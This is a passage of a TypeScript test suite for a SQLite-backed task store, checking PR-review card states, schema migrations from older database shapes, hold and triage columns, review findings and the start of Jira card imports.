			run: await store.startPrRun(12, "abc", 1),
			number: 12,
			head: "abc",
			draft: "d",
			prompt: "p",
			blocking: true,
		});
		expect(card.state).toBe("needs_you");
		// Posted head: done/idle, done_at stamped once.
		await store.savePrReview({
			...(await store.getPrReview(12))!,
			postedHead: "abc",
		});
		await store.syncPrCard(12);
		const done = (await store.getTask(card.id))!;
		expect(done).toMatchObject({
			stage: "done",
			state: "idle",
			needsReason: null,
		});
		expect(done.doneAt).not.toBeNull();
		Bun.sleepSync(5);
		await store.syncPrCard(12);
		const same = (await store.getTask(card.id))!;
		expect(same.doneAt).toBe(done.doneAt);
		expect(same.updatedAt).toBe(done.updatedAt);
		// A new head's draft on the posted card waits again.
		const again = await store.savePrDraft({
			run: await store.startPrRun(12, "def", 2),
			number: 12,
			head: "def",
			draft: "d2",
			prompt: "p",
			blocking: true,
		});
		expect(again).toMatchObject({ stage: "in_progress", state: "needs_you" });
		// Closed: done/idle.
		await store.setPrState(12, "closed");
		await store.syncPrCard(12);
		expect(await store.getTask(card.id)).toMatchObject({
			stage: "done",
			state: "idle",
		});
		// Reopened: waits again.
		await store.setPrState(12, "open");
		await store.syncPrCard(12);
		expect(await store.getTask(card.id)).toMatchObject({
			stage: "in_progress",
			state: "needs_you",
		});
		// A cancelled card stays as it is.
		await store.updateTask(card.id, { cancelledAt: 5 });
		await store.setPrState(12, "merged");
		await store.syncPrCard(12);
		expect(await store.getTask(card.id)).toMatchObject({
			stage: "in_progress",
			state: "needs_you",
		});
		// No card: no throw, no write.
		await store.savePrReview({ ...row, number: 13 });
		await store.syncPrCard(13);
		await store.syncPrCard(99);
		expect(await store.listTasks()).toHaveLength(1);
	});

	test("an old database gains the pr_review tables on open, same shape as fresh", async () => {
		const dir = join(root, "pr-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.close();
		const store = await open(dir);
		await store.savePrReview(row);
		expect(await store.getPrReview(12)).toEqual(row);
		await store.close();

		await (await open(join(root, "pr-migration-fresh"))).close();
		const ddl = (path: string) => {
			const db = new Database(join(path, ".tasks", "tasks.db"));
			const sql = db
				.query<{ name: string; sql: string }, []>(
					"SELECT name, sql FROM sqlite_master WHERE name IN ('pr_review', 'pr_review_runs') ORDER BY name",
				)
				.all();
			db.close();
			return sql;
		};
		const migrated = ddl(dir);
		expect(migrated.map((t) => t.name)).toEqual([
			"pr_review",
			"pr_review_runs",
		]);
		expect(migrated).toEqual(ddl(join(root, "pr-migration-fresh")));
	});

	test("a pre-posted_url pr_review converges on open and setPrPostedUrl round-trips", async () => {
		const dir = join(root, "pr-posted-url");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.exec(`CREATE TABLE pr_review (
  number INTEGER PRIMARY KEY,
  task_id TEXT,
  head TEXT NOT NULL,
  first_seen_at INTEGER NOT NULL,
  reviewed_head TEXT,
  posted_head TEXT,
  state TEXT NOT NULL CHECK (state IN ('open','closed','merged')),
  draft INTEGER NOT NULL,
  title TEXT NOT NULL,
  post_error TEXT
)`);
		old.run(
			"INSERT INTO pr_review (number, head, first_seen_at, state, draft, title) VALUES (7, 'abc', 1, 'open', 0, 'Old row')",
		);
		old.close();
		const store = await open(dir);
		expect(await store.getPrReview(7)).toMatchObject({ postedUrl: null });
		const url = "https://github.com/acme/widget/pull/7#pullrequestreview-2";
		await store.setPrPostedUrl(7, url, "ottr[bot]");
		expect((await store.getPrReview(7))?.postedUrl).toBe(url);
		expect((await store.getPrReview(7))?.postedLogin).toBe("ottr[bot]");
		await store.setPrPostedUrl(7, null);
		expect((await store.getPrReview(7))?.postedUrl).toBeNull();
		expect((await store.getPrReview(7))?.postedLogin).toBeNull();
		await store.close();
	});

	test("a pre-posted_login pr_review (with posted_url) converges on open and setPrPostedUrl round-trips", async () => {
		const dir = join(root, "pr-posted-login");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.exec(`CREATE TABLE pr_review (
  number INTEGER PRIMARY KEY,
  task_id TEXT,
  head TEXT NOT NULL,
  first_seen_at INTEGER NOT NULL,
  reviewed_head TEXT,
  posted_head TEXT,
  posted_url TEXT,
  state TEXT NOT NULL CHECK (state IN ('open','closed','merged')),
  draft INTEGER NOT NULL,
  title TEXT NOT NULL,
  post_error TEXT
)`);
		old.run(
			"INSERT INTO pr_review (number, head, first_seen_at, posted_head, posted_url, state, draft, title) VALUES (7, 'abc', 1, 'abc', 'https://github.com/acme/widget/pull/7#pullrequestreview-2', 'open', 0, 'Old row')",
		);
		old.close();
		const store = await open(dir);
		expect(await store.getPrReview(7)).toMatchObject({
			postedUrl: "https://github.com/acme/widget/pull/7#pullrequestreview-2",
			postedLogin: null,
		});
		await store.setPrPostedUrl(7, null, "octocat");
		expect((await store.getPrReview(7))?.postedLogin).toBe("octocat");
		await store.setPrPostedUrl(7, null);
		expect(await store.getPrReview(7)).toMatchObject({
			postedUrl: null,
			postedLogin: null,
		});
		await store.close();
	});

	test("a pre-hold fork_branch converges on open and keeps its rows", async () => {
		const dir = join(root, "fork-branch-hold");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.exec(`CREATE TABLE fork_branch (
  fork_id INTEGER NOT NULL,
  branch_hash TEXT NOT NULL,
  branch TEXT NOT NULL,
  head TEXT,
  analyzed_head TEXT,
  first_pending_at INTEGER,
  last_run_at INTEGER,
  last_error TEXT,
  retries INTEGER NOT NULL DEFAULT 0,
  PRIMARY KEY (fork_id, branch_hash)
)`);
		old.run(
			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head) VALUES (1, 'h', 'feat', 'b', 'a')",
		);
		old.close();
		const store = await open(dir);
		// The retired columns converge additively; the row reads with no hold state.
		expect((await store.listForkBranches(1))[0]).toMatchObject({
			head: "b",
			analyzedHead: "a",
		});
		await store.close();
	});

	test("a legacy hold_prs row converts into fork_hold rows on open", async () => {
		const dir = join(root, "fork-branch-hold-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		// The fork_branch shape as the retired cursor hold left it: no fork_hold table.
		old.exec(`CREATE TABLE fork_branch (
  fork_id INTEGER NOT NULL,
  branch_hash TEXT NOT NULL,
  branch TEXT NOT NULL,
  head TEXT,
  analyzed_head TEXT,
  first_pending_at INTEGER,
  last_run_at INTEGER,
  last_error TEXT,
  retries INTEGER NOT NULL DEFAULT 0,
  hold_prs TEXT,
  hold_base TEXT,
  PRIMARY KEY (fork_id, branch_hash)
)`);
		old.run(
			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head, hold_prs, hold_base) VALUES (1, 'h', 'feat', 'b', 'a', '[{\"n\":2,\"head\":\"h2\"}]', 'a')",
		);
		old.run(
			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head, hold_prs) VALUES (2, 'i', 'dev', 'c', NULL, 'not json')",
		);
		old.close();
		const store = await open(dir);
		// Each legacy entry held its PR head: the head sha seeds the per-commit hold
		// row, and the watcher expands the PR's other held commits when it resolves.
		expect(await store.listForkHolds(1)).toEqual([
			{
				forkId: 1,
				branchHash: "h",
				sha: "h2",
				pr: 2,
				prHead: "h2",
				released: 0,
			},
		]);
		expect(await store.listForkHolds(2)).toEqual([]);
		// The retired columns are cleared, so the conversion never runs twice.
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const row = raw
			.query<{ hold_prs: string | null; hold_base: string | null }, []>(
				"SELECT hold_prs, hold_base FROM fork_branch WHERE fork_id = 1",
			)
			.get();
		raw.close();
		// hold_prs is spent; hold_base stays for the watcher's expansion, which
		// clears it once the legacy hold is per-commit.
		expect(row).toEqual({ hold_prs: null, hold_base: "a" });
	});

	const runShape = (dir: string) => {
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		const cols = db
			.query<{ name: string }, []>("PRAGMA table_info(pr_review_runs)")
			.all()
			.map((c) => c.name);
		const indexes = db
			.query<{ name: string }, []>("PRAGMA index_list(pr_review_runs)")
			.all()
			.map((c) => c.name);
		db.close();
		return { cols, indexes };
	};

	test("a first-release pr_review_runs without head converges on open and the run methods work", async () => {
		const dir = join(root, "pr-runs-no-head");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.exec(`CREATE TABLE pr_review_runs (
  number INTEGER NOT NULL,
  started_at INTEGER NOT NULL
)`);
		old.run("INSERT INTO pr_review_runs (number, started_at) VALUES (7, 1000)");
		old.close();
		const store = await open(dir);
		// The headless first-release row cannot satisfy head NOT NULL and drops; it only
		// held the daily rate-limit window. The rebuilt table serves the run methods again.
		expect(await store.prReviewRunsSince(0)).toBe(0);
		await store.savePrReview({ ...row, number: 7 });
		const run = await store.startPrRun(7, "abc", 2000);
		expect(await store.prHeadReviewed(7, "abc")).toBe(false);
		await store.savePrDraft({
			run,
			number: 7,
			head: "abc",
			draft: "d",
			prompt: "p",
			blocking: true,
		});
		expect(await store.prHeadReviewed(7, "abc")).toBe(true);
		await store.close();
		const shape = runShape(dir);
		expect(shape.cols).toEqual([
			"id",
			"number",
			"started_at",
			"head",
			"done",
			"blocking",
		]);
		expect(shape.indexes).toContain("idx_pr_review_runs_at");
	});

	test("a head-era pr_review_runs without id and done keeps its rows through the rebuild", async () => {
		const dir = join(root, "pr-runs-head-era");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.exec(`CREATE TABLE pr_review_runs (
  number INTEGER NOT NULL,
  started_at INTEGER NOT NULL,
  head TEXT NOT NULL
)`);
		old.run(
			"INSERT INTO pr_review_runs (number, started_at, head) VALUES (7, 1000, 'abc')",
		);
		old.run(
			"INSERT INTO pr_review_runs (number, started_at, head) VALUES (8, 2000, 'def')",
		);
		old.close();
		const store = await open(dir);
		// That build wrote each row after its review finished, so the copy counts the old
		// heads as reviewed and keeps the daily-cap window.
		expect(await store.prReviewRunsSince(0)).toBe(2);
		expect(await store.prReviewRunsSince(1500)).toBe(1);
		expect(await store.prHeadReviewed(7, "abc")).toBe(true);
		expect(await store.prHeadReviewed(8, "xyz")).toBe(false);
		await store.close();
		const shape = runShape(dir);
		expect(shape.cols).toEqual([
			"id",
			"number",
			"started_at",
			"head",
			"done",
			"blocking",
		]);
	});

	test("a pre-blocking pr_review_runs gains the column on open and old runs read as blocking", async () => {
		const dir = join(root, "pr-runs-no-blocking");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.exec(`CREATE TABLE pr_review_runs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  number INTEGER NOT NULL,
  started_at INTEGER NOT NULL,
  head TEXT NOT NULL,
  done INTEGER NOT NULL DEFAULT 0
)`);
		old.run(
			"INSERT INTO pr_review_runs (number, started_at, head, done) VALUES (7, 1000, 'abc', 1)",
		);
		old.close();
		const store = await open(dir);
		// The column lands additively with its default, so the unrecorded verdict reads as
		// blocking and an approval needs a run that saved a clean one.
		expect(await store.lastPrRunBlocking(7)).toBe(true);
		await store.savePrReview({ ...row, number: 7 });
		const run = await store.startPrRun(7, "abc", 2000);
		await store.savePrDraft({
			run,
			number: 7,
			head: "abc",
			draft: "d",
			prompt: "p",
			blocking: false,
		});
		expect(await store.lastPrRunBlocking(7)).toBe(false);
		await store.close();
		const shape = runShape(dir);
		expect(shape.cols).toEqual([
			"id",
			"number",
			"started_at",
			"head",
			"done",
			"blocking",
		]);
	});

	test("lastPrRunBlocking reads the newest done run's verdict and defaults to blocking", async () => {
		const store = await open(join(root, "pr-runs-verdict"));
		// No runs at all.
		expect(await store.lastPrRunBlocking(12)).toBe(true);
		await store.startPrRun(12, "abc", 1000);
		// An un-done run has no verdict yet.
		expect(await store.lastPrRunBlocking(12)).toBe(true);
		await store.savePrReview(row);
		await store.savePrDraft({
			run: await store.startPrRun(12, "abc", 1000),
			number: 12,
			head: "abc",
			draft: "d",
			prompt: "p",
			blocking: false,
		});
		expect(await store.lastPrRunBlocking(12)).toBe(false);
		await store.savePrDraft({
			run: await store.startPrRun(12, "abc", 2000),
			number: 12,
			head: "abc",
			draft: "d2",
			prompt: "p",
			blocking: true,
		});
		// The newest done run wins.
		expect(await store.lastPrRunBlocking(12)).toBe(true);
		await store.close();
	});
});

describe("triage columns", () => {
	test("updateTask persists priority and closeCandidate and null clears", async () => {
		const store = await open(join(root, "triage"));
		const task = await store.createTask("rate me");
		expect(task.priority).toBeNull();
		expect(task.closeCandidate).toBeNull();
		await store.updateTask(task.id, {
			priority: "P1",
			closeCandidate: "dup of X",
		});
		expect((await store.getTask(task.id))?.priority).toBe("P1");
		expect((await store.getTask(task.id))?.closeCandidate).toBe("dup of X");
		await store.updateTask(task.id, { priority: null, closeCandidate: null });
		expect((await store.getTask(task.id))?.priority).toBeNull();
		expect((await store.getTask(task.id))?.closeCandidate).toBeNull();
		await store.close();

		const reopened = await open(join(root, "triage"));
		expect((await reopened.getTask(task.id))?.priority).toBeNull();
		await reopened.close();
	});
});

describe("learnings", () => {
	test("an old-shape database gains the triage columns and the learnings table on open", async () => {
		const dir = join(root, "learnings-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		// Current TASKS_DDL: priority/close_candidate are ALTER-only, so it is already the old shape.
		const ref = await open(join(root, "learnings-schema-ref"));
		await ref.close();
		const refDb = new Database(
			join(root, "learnings-schema-ref", ".tasks", "tasks.db"),
		);
		const ddl =
			refDb
				.query<{ sql: string }, []>(
					"SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'tasks'",
				)
				.get()?.sql ?? "";
		// A fresh database has the retired table too: CREATE TABLE IF NOT EXISTS in the schema.
		expect(
			refDb
				.query<{ name: string }, []>(
					"SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'learnings'",
				)
				.get(),
		).toBeTruthy();
		refDb.close();
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(ddl);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'old card', 'todo', 'queued', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		// Rows survive; the new fields read as their null defaults.
		const seed = await store.getTask("seed1");
		expect(seed?.title).toBe("old card");
		expect(seed?.priority).toBeNull();
		expect(seed?.closeCandidate).toBeNull();
		// The retired learnings table still exists here; nothing reads or writes it.
		await store.close();
		const reopened = new Database(join(dir, ".tasks", "tasks.db"));
		expect(
			reopened
				.query<{ name: string }, []>(
					"SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'learnings'",
				)
				.get(),
		).toBeTruthy();
		await reopened.close();
	});
});

describe("push retries (OTTR-394)", () => {
	test("a database created before push_retries converges on open and the field round-trips", async () => {
		const dir = join(root, "push-retries-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		// The tasks DDL of a fresh database minus the ALTER-only push_retries column: the
		// shape every live database carried before this feature.
		const ref = await open(join(root, "push-retries-schema-ref"));
		await ref.close();
		const refDb = new Database(
			join(root, "push-retries-schema-ref", ".tasks", "tasks.db"),
		);
		const ddl =
			refDb
				.query<{ sql: string }, []>(
					"SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'tasks'",
				)
				.get()?.sql ?? "";
		refDb.close();
		const legacy = ddl.replace(
			/,\s*push_retries INTEGER NOT NULL DEFAULT 0/,
			"",
		);
		expect(legacy).not.toBe(ddl);
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(legacy);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'old card', 'merging', 'queued', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		expect((await store.getTask("seed1"))?.pushRetries).toBe(0);
		await store.updateTask("seed1", { pushRetries: 2 });
		expect((await store.getTask("seed1"))?.pushRetries).toBe(2);
		await store.close();
		const reopened = await open(dir);
		expect((await reopened.getTask("seed1"))?.pushRetries).toBe(2);
		await reopened.close();
	});
});

describe("starred flag", () => {
	test("a fresh task defaults to unstarred and updateTask persists the flag across reopen", async () => {
		const store = await open(join(root, "starred"));
		const task = await store.createTask("pin me");
		expect(task.starred).toBe(false);
		await store.updateTask(task.id, { starred: true });
		expect((await store.getTask(task.id))?.starred).toBe(true);
		await store.close();
		const reopened = await open(join(root, "starred"));
		expect((await reopened.getTask(task.id))?.starred).toBe(true);
		await reopened.close();
	});

	test("an old database without the starred column gains it with default 0 on open", async () => {
		const dir = join(root, "starred-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const ref = await open(join(root, "starred-schema-ref"));
		await ref.close();
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(
			`ATTACH '${join(root, "starred-schema-ref", ".tasks", "tasks.db")}' AS ref`,
		);
		db.exec("CREATE TABLE tasks AS SELECT * FROM ref.tasks WHERE 0");
		db.exec("DETACH ref");
		db.exec("ALTER TABLE tasks DROP COLUMN starred");
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'old card', 'todo', 'queued', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		const seed = await store.getTask("seed1");
		expect(seed?.title).toBe("old card");
		expect(seed?.starred).toBe(false);
		await store.close();
	});
});

describe("hold provider columns", () => {
	test("open backfills hold_provider and hold_window on a pre-existing database and they round-trip", async () => {
		const dir = join(root, "legacy-hold-provider");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before OTTR-688 added the usage-hold owner columns; one row
		// already held on the old shape.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', hold_until INTEGER)",
		);
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at, hold_until) VALUES ('old1', 'held', 'p', 'todo', 'queued', 1, 1, 5000)",
		);
		db.close();
		const store = await open(dir);
		// The old row converges: the columns exist and read null (owner unknown).
		const old = await store.getTask("old1");
		expect(old?.holdUntil).toBe(5000);
		expect(old?.holdProvider).toBeNull();
		expect(old?.holdWindow).toBeNull();
		const task = await store.createTask("held for zai");
		expect(task.holdProvider).toBeNull();
		expect(task.holdWindow).toBeNull();
		await store.updateTask(task.id, {
			holdUntil: 1_000,
			holdProvider: "zai",
			holdWindow: "7d",
		});
		const round = await store.getTask(task.id);
		expect(round?.holdUntil).toBe(1_000);
		expect(round?.holdProvider).toBe("zai");
		expect(round?.holdWindow).toBe("7d");
		// Clearing a hold clears its owner in the same write.
		await store.updateTask(task.id, {
			holdUntil: null,
			holdProvider: null,
			holdWindow: null,
		});
		const cleared = await store.getTask(task.id);
		expect(cleared?.holdUntil).toBeNull();
		expect(cleared?.holdProvider).toBeNull();
		expect(cleared?.holdWindow).toBeNull();
		await store.close();
	});

	test("open backfills hold_attempts and hold_set_at on a pre-existing database and they round-trip", async () => {
		const dir = join(root, "legacy-hold-attempts");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before OTTR-880 added the consecutive-hold counter.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', hold_until INTEGER)",
		);
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at, hold_until) VALUES ('old1', 'held', 'p', 'todo', 'queued', 1, 1, 5000)",
		);
		db.close();
		const store = await open(dir);
		// The old row converges: the counter exists and reads 0, the stamp reads null.
		expect((await store.getTask("old1"))?.holdAttempts).toBe(0);
		expect((await store.getTask("old1"))?.holdSetAt).toBeNull();
		const task = await store.createTask("probe held");
		expect(task.holdAttempts).toBe(0);
		expect(task.holdSetAt).toBeNull();
		await store.updateTask(task.id, { holdAttempts: 3, holdSetAt: 123 });
		expect((await store.getTask(task.id))?.holdAttempts).toBe(3);
		expect((await store.getTask(task.id))?.holdSetAt).toBe(123);
		// A settle that runs past the limit writes the clear directly.
		await store.updateTask(task.id, { holdAttempts: 0, holdSetAt: null });
		expect((await store.getTask(task.id))?.holdAttempts).toBe(0);
		expect((await store.getTask(task.id))?.holdSetAt).toBeNull();
		await store.close();
	});
});

describe("turn log offset", () => {
	test("open adds log_offset to a database created before it", async () => {
		const dir = join(root, "log-offset-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
			create: true,
		});
		// The turns schema as it was before the log offset existed.
		legacy.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, input TEXT, input_by TEXT, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT, model TEXT, layer TEXT, ran_on TEXT)",
		);
		legacy.close();
		const store = await open(dir);
		const task = await store.createTask("legacy offset");
		// The offset path runs against the freshly added column without throwing.
		const turn = await store.startTurn(task.id, "work", "p", null);
		expect(turn.logOffset).toBeNull();
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const cols = raw
			.query<{ name: string; notnull: number }, []>("PRAGMA table_info(turns)")
			.all()
			.filter((c) => c.name === "log_offset");
		raw.close();
		expect(cols).toHaveLength(1);
		expect(cols[0]?.notnull).toBe(0);
	});

	test("startTurn stores the passed offset and the default stays null", async () => {
		const store = await open(join(root, "turn-log-offset-basic"));
		const task = await store.createTask("offset things");
		const plain = await store.startTurn(task.id, "work", "p", null);
		expect(plain.logOffset).toBeNull();
		const placed = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			null,
			null,
			null,
			42,
		);
		expect(placed.logOffset).toBe(42);
		// The read-back row carries it: a fresh list sees the stored offset too.
		expect((await store.listTurns(task.id)).map((t) => t.logOffset)).toEqual([
			null,
			42,
		]);
		await store.close();
	});
});

describe("review findings storage", () => {
	// A database from before review findings existed: the current tasks DDL
	// minus the migrated findings_checked_at column, and no review_findings table.
	const PRE_FINDINGS_TASKS_DDL = `CREATE TABLE IF NOT EXISTS tasks (
		id TEXT PRIMARY KEY,
		title TEXT,
		prompt TEXT,
		stage TEXT NOT NULL CHECK (stage IN ('todo','in_progress','merging','done','backlog')),
		state TEXT NOT NULL CHECK (state IN ('queued','preparing','running','needs_you','idle')),
		needs_reason TEXT,
		pending_prompt TEXT,
		branch TEXT,
		base TEXT,
		worktree TEXT,
		session_id TEXT,
		summary TEXT,
		details TEXT,
		report TEXT,
		research INTEGER NOT NULL DEFAULT 0,
		research_steps TEXT NOT NULL DEFAULT 'unknown',
		created_at INTEGER NOT NULL,
		updated_at INTEGER NOT NULL,
		queued_at INTEGER,
		cancelled_at INTEGER,
		images TEXT NOT NULL DEFAULT '[]',
		pending_images TEXT NOT NULL DEFAULT '[]',
		shots TEXT NOT NULL DEFAULT '[]',
		release_version TEXT,
		release_notes TEXT,
		session_title TEXT,
		asked TEXT,
		model TEXT,
		kept_files TEXT NOT NULL DEFAULT '[]',
		follow_up_of TEXT,
		push_sha TEXT,
		update_ids TEXT NOT NULL DEFAULT '[]',
		update_merge_approved INTEGER NOT NULL DEFAULT 0
	)`;

	const finding = (prompt: string): RecordedFinding => ({
		prompt,
		model: "zai/glm-5.3-flash",
		rank: 2,
		security: null,
	});

	test("open converges an old-schema database: rows survive, review_findings exists, findingsCheckedAt is null", async () => {
		const dir = join(root, "review-findings-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(PRE_FINDINGS_TASKS_DDL);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'seeded review', 'in_progress', 'running', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		// The seeded row survives the migration.
		expect((await store.getTask("seed1"))?.title).toBe("seeded review");
		expect((await store.getTask("seed1"))?.state).toBe("running");
		// The migrated column exists and maps to a null stamp.
		expect((await store.getTask("seed1"))?.findingsCheckedAt).toBeNull();
		// The new table accepts rows.
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		raw.exec(
			"INSERT INTO review_findings (card_id, prompt, model, rank, security, created_at) VALUES ('seed1', 'Needs validation: suspicious retry loop', 'zai/glm-5.3-flash', 3, NULL, 1)",
		);
		expect(
			raw
				.query<{ n: number }, []>(
					"SELECT COUNT(*) AS n FROM review_findings WHERE card_id = 'seed1'",
				)
				.get()?.n,
		).toBe(1);
		raw.close();
	});

	test("appendReviewFinding stores findings and listReviewFindings returns them in arrival order", async () => {
		const dir = join(root, "review-findings-roundtrip");
		const store = await open(dir);
		const card = await store.createTask("review card");
		await store.updateTask(card.id, { stage: "in_progress" });

		const first = finding("Needs validation: flaky session replay");
		const second = finding("Unchecked error path in applyEvent");
		expect(await store.appendReviewFinding(card.id, first)).toBe(true);
		expect(await store.appendReviewFinding(card.id, second)).toBe(true);

		expect(await store.listReviewFindings(card.id)).toEqual([first, second]);
		// Another card sees none of them.
		const other = await store.createTask("other card");
		expect(await store.listReviewFindings(other.id)).toEqual([]);
		await store.close();
	});

	test("a duplicate prompt stores once, returns false, and does not reset a set findingsCheckedAt", async () => {
		const dir = join(root, "review-findings-duplicate");
		const store = await open(dir);
		const card = await store.createTask("review card");
		await store.updateTask(card.id, { stage: "in_progress" });

		const findingText = "Needs validation: retry swallows errors";
		expect(await store.appendReviewFinding(card.id, finding(findingText))).toBe(
			true,
		);
		await store.updateTask(card.id, { findingsCheckedAt: Date.now() });
		expect((await store.getTask(card.id))?.findingsCheckedAt).not.toBeNull();

		// The duplicate is rejected and leaves the stamp alone.
		expect(await store.appendReviewFinding(card.id, finding(findingText))).toBe(
			false,
		);
		expect(await store.listReviewFindings(card.id)).toHaveLength(1);
		expect((await store.getTask(card.id))?.findingsCheckedAt).not.toBeNull();
		await store.close();
	});

	test("a new finding resets a set findingsCheckedAt to null", async () => {
		const dir = join(root, "review-findings-stamp-reset");
		const store = await open(dir);
		const card = await store.createTask("review card");
		await store.updateTask(card.id, { stage: "in_progress" });

		await store.appendReviewFinding(
			card.id,
			finding("Needs validation: lost report"),
		);
		await store.updateTask(card.id, { findingsCheckedAt: Date.now() });
		expect((await store.getTask(card.id))?.findingsCheckedAt).not.toBeNull();

		expect(
			await store.appendReviewFinding(
				card.id,
				finding("Confirmed: unbounded workpool queue"),
			),
		).toBe(true);
		expect((await store.getTask(card.id))?.findingsCheckedAt).toBeNull();
		await store.close();
	});
});

describe("jira imports", () => {
	const site = "https://acme.atlassian.net";
	const items = (...keys: string[]) =>
		keys.map((key) => ({ key, title: `${key}: t`, prompt: `prompt ${key}` }));

	test("settings default to null and round-trip", async () => {
		const store = await open(join(root, "jira-settings"));
		const s = await store.getSettings();
		expect(s.jiraConnection).toBeNull();
		expect(s.jiraLastJql).toBeNull();
		await store.setSettings({
			jiraConnection: "acme",
			jiraLastJql: "project = X",
		});
		await store.close();
		const again = await (await open(join(root, "jira-settings"))).getSettings();
		expect(again.jiraConnection).toBe("acme");
		expect(again.jiraLastJql).toBe("project = X");
	});

	test("files backlog cards idle and todo cards queued", async () => {
		const store = await open(join(root, "jira-file"));
		const r = await store.fileJiraCards({
			site,
			stage: "backlog",
			items: items("A-1", "A-2", "A-3"),
			now: 1,
		});
		expect(r.skipped).toEqual([]);
		expect(r.filed).toHaveLength(3);
		for (const [i, t] of r.filed.entries()) {
			expect(t).toMatchObject({
				stage: "backlog",
				state: "idle",
				topic: "jira",
				queuedAt: null,
				title: `A-${i + 1}: t`,
				prompt: `prompt A-${i + 1}`,
			});
			expect((await store.getTask(t.id))?.stage).toBe("backlog");
		}
		const todo = await store.fileJiraCards({
			site,
			stage: "todo",
			items: items("B-1"),
			now: 2,
		});
		expect(todo.filed[0]).toMatchObject({
